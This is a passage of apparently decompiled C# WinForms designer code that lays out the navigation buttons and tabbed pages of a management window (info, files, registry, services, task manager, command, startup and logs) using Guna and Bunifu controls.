        this.ButCmd.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButCmd.CustomBorderColor = System.Drawing.Color.White;
        this.ButCmd.CustomImages.CheckedImage = (System.Drawing.Image)resources.GetObject("ButCmd.CustomImages.CheckedImage");
        this.ButCmd.CustomImages.HoveredImage = (System.Drawing.Image)resources.GetObject("ButCmd.CustomImages.HoveredImage");
        this.ButCmd.CustomImages.Image = (System.Drawing.Image)resources.GetObject("ButCmd.CustomImages.Image");
        this.ButCmd.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButCmd.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButCmd.CustomImages.Parent = this.ButCmd;
        this.ButCmd.FillColor = System.Drawing.Color.White;
        this.ButCmd.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButCmd.ForeColor = System.Drawing.Color.White;
        this.ButCmd.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButCmd.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButCmd.HoverState.FillColor = System.Drawing.Color.White;
        this.ButCmd.HoverState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButCmd.HoverState.Parent = this.ButCmd;
        this.ButCmd.ImageSize = new System.Drawing.Size(27, 27);
        this.ButCmd.Location = new System.Drawing.Point(3, 330);
        this.ButCmd.Name = "ButCmd";
        this.ButCmd.PressedColor = System.Drawing.Color.White;
        this.ButCmd.ShadowDecoration.Parent = this.ButCmd;
        this.ButCmd.Size = new System.Drawing.Size(38, 38);
        this.ButCmd.TabIndex = 18;
        this.ButCmd.UseTransparentBackground = true;
        this.ButCmd.Click += new System.EventHandler(ButCmd_Click);
        this.ButStartup.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButStartup.BackColor = System.Drawing.Color.Transparent;
        this.ButStartup.BorderRadius = 10;
        this.ButStartup.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButStartup.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButStartup.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButStartup.CheckedState.FillColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButStartup.CheckedState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButStartup.CheckedState.Parent = this.ButStartup;
        this.ButStartup.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButStartup.CustomBorderColor = System.Drawing.Color.White;
        this.ButStartup.CustomImages.CheckedImage = (System.Drawing.Image)resources.GetObject("ButStartup.CustomImages.CheckedImage");
        this.ButStartup.CustomImages.HoveredImage = (System.Drawing.Image)resources.GetObject("ButStartup.CustomImages.HoveredImage");
        this.ButStartup.CustomImages.Image = (System.Drawing.Image)resources.GetObject("ButStartup.CustomImages.Image");
        this.ButStartup.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButStartup.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButStartup.CustomImages.Parent = this.ButStartup;
        this.ButStartup.FillColor = System.Drawing.Color.White;
        this.ButStartup.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButStartup.ForeColor = System.Drawing.Color.White;
        this.ButStartup.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButStartup.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButStartup.HoverState.FillColor = System.Drawing.Color.White;
        this.ButStartup.HoverState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButStartup.HoverState.Parent = this.ButStartup;
        this.ButStartup.ImageSize = new System.Drawing.Size(27, 27);
        this.ButStartup.Location = new System.Drawing.Point(3, 374);
        this.ButStartup.Name = "ButStartup";
        this.ButStartup.PressedColor = System.Drawing.Color.White;
        this.ButStartup.ShadowDecoration.Parent = this.ButStartup;
        this.ButStartup.Size = new System.Drawing.Size(38, 38);
        this.ButStartup.TabIndex = 17;
        this.ButStartup.UseTransparentBackground = true;
        this.ButStartup.Click += new System.EventHandler(ButStartup_Click);
        this.ButTaskManager.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButTaskManager.BackColor = System.Drawing.Color.Transparent;
        this.ButTaskManager.BorderRadius = 10;
        this.ButTaskManager.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButTaskManager.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButTaskManager.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButTaskManager.CheckedState.FillColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButTaskManager.CheckedState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButTaskManager.CheckedState.Parent = this.ButTaskManager;
        this.ButTaskManager.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButTaskManager.CustomBorderColor = System.Drawing.Color.White;
        this.ButTaskManager.CustomImages.CheckedImage = (System.Drawing.Image)resources.GetObject("ButTaskManager.CustomImages.CheckedImage");
        this.ButTaskManager.CustomImages.HoveredImage = (System.Drawing.Image)resources.GetObject("ButTaskManager.CustomImages.HoveredImage");
        this.ButTaskManager.CustomImages.Image = (System.Drawing.Image)resources.GetObject("ButTaskManager.CustomImages.Image");
        this.ButTaskManager.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButTaskManager.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButTaskManager.CustomImages.Parent = this.ButTaskManager;
        this.ButTaskManager.FillColor = System.Drawing.Color.White;
        this.ButTaskManager.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButTaskManager.ForeColor = System.Drawing.Color.White;
        this.ButTaskManager.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButTaskManager.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButTaskManager.HoverState.FillColor = System.Drawing.Color.White;
        this.ButTaskManager.HoverState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButTaskManager.HoverState.Parent = this.ButTaskManager;
        this.ButTaskManager.ImageSize = new System.Drawing.Size(27, 27);
        this.ButTaskManager.Location = new System.Drawing.Point(3, 286);
        this.ButTaskManager.Name = "ButTaskManager";
        this.ButTaskManager.PressedColor = System.Drawing.Color.White;
        this.ButTaskManager.ShadowDecoration.Parent = this.ButTaskManager;
        this.ButTaskManager.Size = new System.Drawing.Size(38, 38);
        this.ButTaskManager.TabIndex = 16;
        this.ButTaskManager.UseTransparentBackground = true;
        this.ButTaskManager.Click += new System.EventHandler(ButTaskManager_Click);
        this.ButConnection.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButConnection.BackColor = System.Drawing.Color.Transparent;
        this.ButConnection.BorderRadius = 10;
        this.ButConnection.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButConnection.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButConnection.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButConnection.CheckedState.FillColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButConnection.CheckedState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButConnection.CheckedState.Parent = this.ButConnection;
        this.ButConnection.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButConnection.CustomBorderColor = System.Drawing.Color.White;
        this.ButConnection.CustomImages.CheckedImage = (System.Drawing.Image)resources.GetObject("ButConnection.CustomImages.CheckedImage");
        this.ButConnection.CustomImages.HoveredImage = (System.Drawing.Image)resources.GetObject("ButConnection.CustomImages.HoveredImage");
        this.ButConnection.CustomImages.Image = (System.Drawing.Image)resources.GetObject("ButConnection.CustomImages.Image");
        this.ButConnection.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButConnection.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButConnection.CustomImages.Parent = this.ButConnection;
        this.ButConnection.FillColor = System.Drawing.Color.White;
        this.ButConnection.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButConnection.ForeColor = System.Drawing.Color.White;
        this.ButConnection.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButConnection.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButConnection.HoverState.FillColor = System.Drawing.Color.White;
        this.ButConnection.HoverState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButConnection.HoverState.Parent = this.ButConnection;
        this.ButConnection.ImageSize = new System.Drawing.Size(27, 27);
        this.ButConnection.Location = new System.Drawing.Point(3, 242);
        this.ButConnection.Name = "ButConnection";
        this.ButConnection.PressedColor = System.Drawing.Color.White;
        this.ButConnection.ShadowDecoration.Parent = this.ButConnection;
        this.ButConnection.Size = new System.Drawing.Size(38, 38);
        this.ButConnection.TabIndex = 14;
        this.ButConnection.UseTransparentBackground = true;
        this.ButConnection.Click += new System.EventHandler(ButConnection_Click);
        this.ButLogs.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
        this.ButLogs.BackColor = System.Drawing.Color.Transparent;
        this.ButLogs.BorderRadius = 10;
        this.ButLogs.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButLogs.Checked = true;
        this.ButLogs.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButLogs.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButLogs.CheckedState.FillColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButLogs.CheckedState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButLogs.CheckedState.Parent = this.ButLogs;
        this.ButLogs.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButLogs.CustomBorderColor = System.Drawing.Color.White;
        this.ButLogs.CustomImages.CheckedImage = (System.Drawing.Image)resources.GetObject("ButLogs.CustomImages.CheckedImage");
        this.ButLogs.CustomImages.HoveredImage = (System.Drawing.Image)resources.GetObject("ButLogs.CustomImages.HoveredImage");
        this.ButLogs.CustomImages.Image = (System.Drawing.Image)resources.GetObject("ButLogs.CustomImages.Image");
        this.ButLogs.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButLogs.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButLogs.CustomImages.Parent = this.ButLogs;
        this.ButLogs.FillColor = System.Drawing.Color.White;
        this.ButLogs.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButLogs.ForeColor = System.Drawing.Color.White;
        this.ButLogs.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButLogs.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButLogs.HoverState.FillColor = System.Drawing.Color.White;
        this.ButLogs.HoverState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButLogs.HoverState.Parent = this.ButLogs;
        this.ButLogs.ImageSize = new System.Drawing.Size(27, 27);
        this.ButLogs.Location = new System.Drawing.Point(3, 476);
        this.ButLogs.Name = "ButLogs";
        this.ButLogs.PressedColor = System.Drawing.Color.White;
        this.ButLogs.ShadowDecoration.Parent = this.ButLogs;
        this.ButLogs.Size = new System.Drawing.Size(38, 38);
        this.ButLogs.TabIndex = 15;
        this.ButLogs.UseTransparentBackground = true;
        this.ButLogs.Click += new System.EventHandler(ButLogs_Click);
        this.ButRegistry.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButRegistry.BackColor = System.Drawing.Color.Transparent;
        this.ButRegistry.BorderRadius = 10;
        this.ButRegistry.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButRegistry.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButRegistry.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButRegistry.CheckedState.FillColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButRegistry.CheckedState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButRegistry.CheckedState.Parent = this.ButRegistry;
        this.ButRegistry.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButRegistry.CustomBorderColor = System.Drawing.Color.White;
        this.ButRegistry.CustomImages.CheckedImage = (System.Drawing.Image)resources.GetObject("ButRegistry.CustomImages.CheckedImage");
        this.ButRegistry.CustomImages.HoveredImage = (System.Drawing.Image)resources.GetObject("ButRegistry.CustomImages.HoveredImage");
        this.ButRegistry.CustomImages.Image = (System.Drawing.Image)resources.GetObject("ButRegistry.CustomImages.Image");
        this.ButRegistry.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButRegistry.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButRegistry.CustomImages.Parent = this.ButRegistry;
        this.ButRegistry.FillColor = System.Drawing.Color.White;
        this.ButRegistry.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButRegistry.ForeColor = System.Drawing.Color.White;
        this.ButRegistry.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButRegistry.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButRegistry.HoverState.FillColor = System.Drawing.Color.White;
        this.ButRegistry.HoverState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButRegistry.HoverState.Parent = this.ButRegistry;
        this.ButRegistry.ImageSize = new System.Drawing.Size(27, 27);
        this.ButRegistry.Location = new System.Drawing.Point(3, 154);
        this.ButRegistry.Name = "ButRegistry";
        this.ButRegistry.PressedColor = System.Drawing.Color.White;
        this.ButRegistry.ShadowDecoration.Parent = this.ButRegistry;
        this.ButRegistry.Size = new System.Drawing.Size(38, 38);
        this.ButRegistry.TabIndex = 13;
        this.ButRegistry.UseTransparentBackground = true;
        this.ButRegistry.Click += new System.EventHandler(ButRegistry_Click);
        this.ButServices.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButServices.BackColor = System.Drawing.Color.Transparent;
        this.ButServices.BorderRadius = 10;
        this.ButServices.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButServices.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButServices.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButServices.CheckedState.FillColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButServices.CheckedState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButServices.CheckedState.Parent = this.ButServices;
        this.ButServices.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButServices.CustomBorderColor = System.Drawing.Color.White;
        this.ButServices.CustomImages.CheckedImage = (System.Drawing.Image)resources.GetObject("ButServices.CustomImages.CheckedImage");
        this.ButServices.CustomImages.HoveredImage = (System.Drawing.Image)resources.GetObject("ButServices.CustomImages.HoveredImage");
        this.ButServices.CustomImages.Image = (System.Drawing.Image)resources.GetObject("ButServices.CustomImages.Image");
        this.ButServices.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButServices.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButServices.CustomImages.Parent = this.ButServices;
        this.ButServices.FillColor = System.Drawing.Color.White;
        this.ButServices.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButServices.ForeColor = System.Drawing.Color.White;
        this.ButServices.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButServices.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButServices.HoverState.FillColor = System.Drawing.Color.White;
        this.ButServices.HoverState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButServices.HoverState.Parent = this.ButServices;
        this.ButServices.ImageSize = new System.Drawing.Size(27, 27);
        this.ButServices.Location = new System.Drawing.Point(3, 198);
        this.ButServices.Name = "ButServices";
        this.ButServices.PressedColor = System.Drawing.Color.White;
        this.ButServices.ShadowDecoration.Parent = this.ButServices;
        this.ButServices.Size = new System.Drawing.Size(38, 38);
        this.ButServices.TabIndex = 12;
        this.ButServices.UseTransparentBackground = true;
        this.ButServices.Click += new System.EventHandler(ButServices_Click);
        this.ButFiles.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButFiles.BackColor = System.Drawing.Color.Transparent;
        this.ButFiles.BorderRadius = 10;
        this.ButFiles.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButFiles.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButFiles.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButFiles.CheckedState.FillColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButFiles.CheckedState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButFiles.CheckedState.Parent = this.ButFiles;
        this.ButFiles.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButFiles.CustomBorderColor = System.Drawing.Color.White;
        this.ButFiles.CustomImages.CheckedImage = (System.Drawing.Image)resources.GetObject("ButFiles.CustomImages.CheckedImage");
        this.ButFiles.CustomImages.HoveredImage = (System.Drawing.Image)resources.GetObject("ButFiles.CustomImages.HoveredImage");
        this.ButFiles.CustomImages.Image = (System.Drawing.Image)resources.GetObject("ButFiles.CustomImages.Image");
        this.ButFiles.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButFiles.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButFiles.CustomImages.Parent = this.ButFiles;
        this.ButFiles.FillColor = System.Drawing.Color.White;
        this.ButFiles.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButFiles.ForeColor = System.Drawing.Color.White;
        this.ButFiles.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButFiles.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButFiles.HoverState.FillColor = System.Drawing.Color.White;
        this.ButFiles.HoverState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButFiles.HoverState.Parent = this.ButFiles;
        this.ButFiles.ImageSize = new System.Drawing.Size(27, 27);
        this.ButFiles.Location = new System.Drawing.Point(3, 110);
        this.ButFiles.Name = "ButFiles";
        this.ButFiles.PressedColor = System.Drawing.Color.White;
        this.ButFiles.ShadowDecoration.Parent = this.ButFiles;
        this.ButFiles.Size = new System.Drawing.Size(38, 38);
        this.ButFiles.TabIndex = 11;
        this.ButFiles.UseTransparentBackground = true;
        this.ButFiles.Click += new System.EventHandler(ButFiles_Click);
        this.ButInstalled.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButInstalled.BackColor = System.Drawing.Color.Transparent;
        this.ButInstalled.BorderRadius = 10;
        this.ButInstalled.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButInstalled.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButInstalled.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButInstalled.CheckedState.FillColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButInstalled.CheckedState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButInstalled.CheckedState.Parent = this.ButInstalled;
        this.ButInstalled.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButInstalled.CustomBorderColor = System.Drawing.Color.White;
        this.ButInstalled.CustomImages.CheckedImage = Properties.Resources.ManagerInstalled2;
        this.ButInstalled.CustomImages.HoveredImage = Properties.Resources.ManagerInstalled2;
        this.ButInstalled.CustomImages.Image = Properties.Resources.ManagerInstalled1;
        this.ButInstalled.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButInstalled.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButInstalled.CustomImages.Parent = this.ButInstalled;
        this.ButInstalled.FillColor = System.Drawing.Color.White;
        this.ButInstalled.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButInstalled.ForeColor = System.Drawing.Color.White;
        this.ButInstalled.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButInstalled.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButInstalled.HoverState.FillColor = System.Drawing.Color.White;
        this.ButInstalled.HoverState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButInstalled.HoverState.Parent = this.ButInstalled;
        this.ButInstalled.ImageSize = new System.Drawing.Size(27, 27);
        this.ButInstalled.Location = new System.Drawing.Point(3, 66);
        this.ButInstalled.Name = "ButInstalled";
        this.ButInstalled.PressedColor = System.Drawing.Color.White;
        this.ButInstalled.ShadowDecoration.Parent = this.ButInstalled;
        this.ButInstalled.Size = new System.Drawing.Size(38, 38);
        this.ButInstalled.TabIndex = 10;
        this.ButInstalled.UseTransparentBackground = true;
        this.ButInstalled.Click += new System.EventHandler(ButInstalled_Click);
        this.ButInfo.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButInfo.BackColor = System.Drawing.Color.Transparent;
        this.ButInfo.BorderRadius = 10;
        this.ButInfo.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButInfo.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButInfo.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButInfo.CheckedState.FillColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButInfo.CheckedState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButInfo.CheckedState.Parent = this.ButInfo;
        this.ButInfo.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButInfo.CustomBorderColor = System.Drawing.Color.White;
        this.ButInfo.CustomImages.CheckedImage = Properties.Resources.ManagerInfo2;
        this.ButInfo.CustomImages.HoveredImage = Properties.Resources.ManagerInfo2;
        this.ButInfo.CustomImages.Image = Properties.Resources.ManagerInfo1;
        this.ButInfo.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButInfo.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButInfo.CustomImages.Parent = this.ButInfo;
        this.ButInfo.FillColor = System.Drawing.Color.White;
        this.ButInfo.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButInfo.ForeColor = System.Drawing.Color.White;
        this.ButInfo.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButInfo.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButInfo.HoverState.FillColor = System.Drawing.Color.White;
        this.ButInfo.HoverState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButInfo.HoverState.Parent = this.ButInfo;
        this.ButInfo.ImageSize = new System.Drawing.Size(27, 27);
        this.ButInfo.Location = new System.Drawing.Point(3, 22);
        this.ButInfo.Name = "ButInfo";
        this.ButInfo.PressedColor = System.Drawing.Color.White;
        this.ButInfo.ShadowDecoration.Parent = this.ButInfo;
        this.ButInfo.Size = new System.Drawing.Size(38, 38);
        this.ButInfo.TabIndex = 9;
        this.ButInfo.UseTransparentBackground = true;
        this.ButInfo.Click += new System.EventHandler(ButInfo_Click);
        this.PageManager.Alignment = System.Windows.Forms.TabAlignment.Bottom;
        this.PageManager.AllowTransitions = false;
        this.PageManager.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PageManager.Controls.Add(this.PageInfo);
        this.PageManager.Controls.Add(this.PageInstall);
        this.PageManager.Controls.Add(this.PageFileManager);
        this.PageManager.Controls.Add(this.PageRegisrty);
        this.PageManager.Controls.Add(this.PageServices);
        this.PageManager.Controls.Add(this.PageConnect);
        this.PageManager.Controls.Add(this.PageTaskManager);
        this.PageManager.Controls.Add(this.PageCmd);
        this.PageManager.Controls.Add(this.PageStartup);
        this.PageManager.Controls.Add(this.PageDownload);
        this.PageManager.Controls.Add(this.PageLogs);
        this.PageManager.Location = new System.Drawing.Point(66, 103);
        this.PageManager.Multiline = true;
        this.PageManager.Name = "PageManager";
        this.PageManager.Page = this.PageInfo;
        this.PageManager.PageIndex = 0;
        this.PageManager.PageName = "PageInfo";
        this.PageManager.PageTitle = "Informations";
        this.PageManager.SelectedIndex = 0;
        this.PageManager.Size = new System.Drawing.Size(745, 491);
        this.PageManager.TabIndex = 603;
        animation.AnimateOnlyDifferences = false;
        animation.BlindCoeff = (System.Drawing.PointF)resources.GetObject("animation1.BlindCoeff");
        animation.LeafCoeff = 0f;
        animation.MaxTime = 1f;
        animation.MinTime = 0f;
        animation.MosaicCoeff = (System.Drawing.PointF)resources.GetObject("animation1.MosaicCoeff");
        animation.MosaicShift = (System.Drawing.PointF)resources.GetObject("animation1.MosaicShift");
        animation.MosaicSize = 0;
        animation.Padding = new System.Windows.Forms.Padding(0);
        animation.RotateCoeff = 0f;
        animation.RotateLimit = 0f;
        animation.ScaleCoeff = (System.Drawing.PointF)resources.GetObject("animation1.ScaleCoeff");
        animation.SlideCoeff = (System.Drawing.PointF)resources.GetObject("animation1.SlideCoeff");
        animation.TimeCoeff = 0f;
        animation.TransparencyCoeff = 0f;
        this.PageManager.Transition = animation;
        this.PageManager.TransitionType = Utilities.BunifuPages.BunifuAnimatorNS.AnimationType.Custom;
        this.PageInfo.Controls.Add(this.Panel1);
        this.PageInfo.Location = new System.Drawing.Point(4, 4);
        this.PageInfo.Name = "PageInfo";
        this.PageInfo.Size = new System.Drawing.Size(737, 465);
        this.PageInfo.TabIndex = 0;
        this.PageInfo.Text = "Informations";
        this.PageInfo.UseVisualStyleBackColor = true;
        this.Panel1.Controls.Add(this.CountInfo);
        this.Panel1.Controls.Add(this.GetInfo);
        this.Panel1.Controls.Add(this.ListInfo);
        this.Panel1.Controls.Add(this.DownTypeInfo);
        this.Panel1.Controls.Add(this.label7);
        this.Panel1.Dock = System.Windows.Forms.DockStyle.Fill;
        this.Panel1.Location = new System.Drawing.Point(0, 0);
        this.Panel1.Name = "Panel1";
        this.Panel1.Size = new System.Drawing.Size(737, 465);
        this.Panel1.TabIndex = 0;
        this.CountInfo.AllowParentOverrides = false;
        this.CountInfo.AutoEllipsis = false;
        this.CountInfo.AutoSize = false;
        this.CountInfo.BackColor = System.Drawing.Color.White;
        this.CountInfo.CursorType = null;
        this.CountInfo.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.CountInfo.ForeColor = System.Drawing.Color.Black;
        this.CountInfo.Location = new System.Drawing.Point(120, 68);
        this.CountInfo.Name = "CountInfo";
        this.CountInfo.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.CountInfo.Size = new System.Drawing.Size(138, 27);
        this.CountInfo.TabIndex = 658;
        this.CountInfo.Text = "0 items";
        this.CountInfo.TextAlignment = System.Drawing.ContentAlignment.MiddleCenter;
        this.CountInfo.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.GetInfo.Animated = true;
        this.GetInfo.BorderRadius = 2;
        this.GetInfo.CheckedState.Parent = this.GetInfo;
        this.GetInfo.CustomImages.Parent = this.GetInfo;
        this.GetInfo.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.GetInfo.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.GetInfo.Font = new System.Drawing.Font("Consolas", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.GetInfo.ForeColor = System.Drawing.Color.White;
        this.GetInfo.HoverState.Parent = this.GetInfo;
        this.GetInfo.Location = new System.Drawing.Point(16, 68);
        this.GetInfo.Name = "GetInfo";
        this.GetInfo.ShadowDecoration.Parent = this.GetInfo;
        this.GetInfo.Size = new System.Drawing.Size(98, 27);
        this.GetInfo.TabIndex = 656;
        this.GetInfo.Text = "Get";
        this.GetInfo.Click += new System.EventHandler(GetInfo_Click);
        this.ListInfo.AllowUserToAddRows = false;
        this.ListInfo.AllowUserToDeleteRows = false;
        this.ListInfo.AllowUserToResizeColumns = false;
        this.ListInfo.AllowUserToResizeRows = false;
        dataGridViewCellStyle.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListInfo.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle;
        this.ListInfo.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.ListInfo.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.AllCells;
        this.ListInfo.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
        this.ListInfo.BackgroundColor = System.Drawing.Color.White;
        this.ListInfo.BorderStyle = System.Windows.Forms.BorderStyle.None;
        this.ListInfo.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListInfo.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
        this.ListInfo.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle2.BackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        dataGridViewCellStyle2.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        dataGridViewCellStyle2.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
        this.ListInfo.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
        this.ListInfo.ColumnHeadersHeight = 30;
        this.ListInfo.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListInfo.Columns.AddRange(this.Column2, this.Column3);
